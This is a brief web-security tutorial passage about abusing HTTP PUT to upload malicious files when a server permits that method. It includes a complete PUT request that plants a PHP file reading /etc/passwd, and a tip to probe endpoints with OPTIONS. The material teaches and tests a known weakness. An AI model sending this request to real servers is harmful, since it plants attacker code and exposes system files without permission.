It's worth noting that some web servers may be configured to support `PUT` requests. If appropriate defenses aren't in place, this can provide an alternative means of uploading malicious files, even when an upload function isn't available via the web interface.
```http
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/etc/passwd'); ?>
```
In order to test if the application supports the `PUT` HTTP method. You can try sending `OPTIONS` requests to different endpoints.
